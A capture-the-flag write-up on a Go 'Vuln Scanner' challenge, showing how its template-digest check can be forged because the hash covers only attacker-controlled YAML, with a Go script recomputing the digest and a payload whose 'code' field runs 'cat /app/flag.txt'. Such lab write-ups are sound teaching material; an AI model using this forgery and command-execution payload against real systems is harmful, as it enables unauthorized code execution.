# Vuln Scanner

tl;dr
- Recreate File Digest implementation  

## Solution

In this challenge, participants are provided with the source code of a website built using Go.

<img width="1680" alt="image" src="https://github.com/user-attachments/assets/1447f7d6-32e4-4e8d-a746-8208943c3fff" />

We can upload YAML files as templates to perform vulnerability scanning.

<img width="1352" alt="image" src="https://github.com/user-attachments/assets/d7d66a0a-b967-4f57-9777-7163222b3cf5" />

However, not all templates can be executed, they must first be verified first. Below is an example of a verified template:

```yaml
name: Code Execution Test
description: A template for testing code execution within the template.
type: http
requests:
  - method: GET
    path:
      - "/test"
    matchers:
      - type: status
        status:
          - 200
code: echo "Executing a simple, safe code block for testing purposes"

# digest: 3ec41e2a51ff8ac34dadf530d4396d86a99db38daff7feb39283c068e299061a
```

Look at the `code` section, we can input a command to achieve Remote Command Execution. Next, we need to understand how to verify the template.

Below is the source code responsible for handling the upload:

```go
func HandleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.ServeFile(w, r, "static/upload.html")
	} else {

		file, _, err := r.FormFile("template")
		if err != nil {
			http.Error(w, "Failed to read file", http.StatusBadRequest)
			return
		}
		defer file.Close()

		content, _ := ioutil.ReadAll(file)

		digestFile := "templates/known_digests.txt"
		digestExists, err := utils.VerifyDigest(string(content), digestFile)
		if err != nil {
			http.Error(w, "Failed to verify template digest", http.StatusUnauthorized)
			return
		}

		if !digestExists {
			http.Error(w, "Template does not match any known digests", http.StatusUnauthorized)
			return
		}

		var templateData map[interface{}]interface{}
		err = yaml.Unmarshal(content, &templateData)
		if err != nil {
			http.Error(w, "Invalid YAML format", http.StatusBadRequest)
			return
		}

		parsedFields := make(map[string]interface{})
		for k, v := range templateData {
			if key, ok := k.(string); ok {
				parsedFields[key] = v
			}
		}

		var simulatedCheck string
		if reqs, ok := parsedFields["requests"].([]interface{}); ok && len(reqs) > 0 {
			request := reqs[0].(map[interface{}]interface{})
			method := request["method"]
			path := request["path"]
			simulatedCheck = fmt.Sprintf("Simulated Check: %s request to %s (Expected status: 200) matched.", method, path)
		} else {
			simulatedCheck = "No valid request in template to simulate."
		}

		code, ok := parsedFields["code"].(string)
		var output string
		if ok {
			output = utils.ExecuteCode(code)
		} else {
			output = "No code block found in template."
		}

		pageData := TemplateOutputPage{
			Title:          "Template Upload Success",
			Message:        "The template was processed successfully.",
			Output:         output,
			ParsedFields:   parsedFields,
			SimulatedCheck: simulatedCheck,
		}

		tmpl, err := template.ParseFiles("static/upload_success.html")
		if err != nil {
			http.Error(w, "Failed to render success page", http.StatusInternalServerError)
			return
		}

		tmpl.Execute(w, pageData)
	}
}
```

In the code the uploaded yaml file is verfied using `utils.VerifyDigest()` function.

```go
func VerifyDigest(content, digestFile string) (bool, error) {
	digestPattern := regexp.MustCompile(`(?m)^#\sdigest:\s([a-fA-F0-9]+)`)
	matches := digestPattern.FindAllStringSubmatch(content, 1) // Only match the first line

	if len(matches) == 0 {
		return false, errors.New("no valid digest found")
	}

	firstDigest := matches[0][1]
	cleanedContent := RemoveDigestComment(content)
	normalizedContent := NormalizeContent(cleanedContent)
	hash := sha256.Sum256([]byte(normalizedContent))
	hexHash := fmt.Sprintf("%x", hash)

	_, err := ioutil.ReadFile(digestFile)
	if err != nil {
		return false, fmt.Errorf("failed to read known digests: %w", err)
	}

	if strings.TrimSpace(hexHash) == firstDigest {
		return true, nil
	}
	return false, errors.New("signature verification failed")
}

func RemoveDigestComment(content string) string {
	lines := strings.Split(content, "\n")
	var cleanedLines []string
	for _, line := range lines {
		if !strings.HasPrefix(strings.TrimSpace(line), "# digest:") {
			cleanedLines = append(cleanedLines, line)
		}
	}
	cleanedContent := strings.Join(cleanedLines, "\n")
	return cleanedContent
}

func NormalizeContent(content string) string {
	var yamlContent interface{}
	err := yaml.Unmarshal([]byte(content), &yamlContent)
	if err != nil {
		return content
	}

	normalizedContent, err := yaml.Marshal(yamlContent)
	if err != nil {
		return content
	}
	normalizedContentStr := strings.TrimSpace(string(normalizedContent))
	return normalizedContentStr
}
```

Basically, in `utils.VerifyDigest()` the function reads the digest included in the YAML file and stores it in the `firstDigest` variable. Then, it removes the digest from the file content using the `RemoveDigestComment()` function, after that normalizes the content by removing spaces with the `NormalizeContent()` function, and computes its SHA-256 hash. This computed hash is then verified against `firstDigest`. If they match, the template is executed.

So, we can simply recreate Digest implementation to inject arbitrary command to `code` block.

yaml Payload:

```yaml
name: Code Execution Test
description: A template for testing code execution within the template.
type: http
requests:
  - method: GET
    path:
      - "/test"
    matchers:
      - type: status
        status:
          - 200
code: cat /app/flag.txt
```

Digest implementation in Go:

```go
package main

import (
	"crypto/sha256"
	"fmt"
	"io/ioutil"
	"os"
	"log"
	"strings"

	"gopkg.in/yaml.v3"
)

func main() {

	filename := "../req.yaml"

	file, err := os.Open(filename)
	if err != nil {
		log.Fatal("Gagal membuka file:", err)
	}
	defer file.Close()

	content, err := ioutil.ReadAll(file)
	if err != nil {
		log.Fatal("Gagal membaca file:", err)
	}

	normalizedContent := NormalizeContent(string(content))
	hash := sha256.Sum256([]byte(normalizedContent))
	hexHash := fmt.Sprintf("%x", hash)
	// fmt.Println(normalizedContent)
	fmt.Println(hexHash)
}

func NormalizeContent(content string) string {
	var yamlContent interface{}
	err := yaml.Unmarshal([]byte(content), &yamlContent)
	if err != nil {
		return content
	}

	normalizedContent, err := yaml.Marshal(yamlContent)
	if err != nil {
		return content
	}
	normalizedContentStr := strings.TrimSpace(string(normalizedContent))
	return normalizedContentStr
}
```

Run the go file to get the digest.

<img width="474" alt="image" src="https://github.com/user-attachments/assets/f22ca27b-36b4-4d0b-a48d-ee52f5b84075" />

Upload the yaml payload and add the Digest

<img width="1242" alt="image" src="https://github.com/user-attachments/assets/b3d14201-935d-4286-bd1f-c330e58cb2d2" />
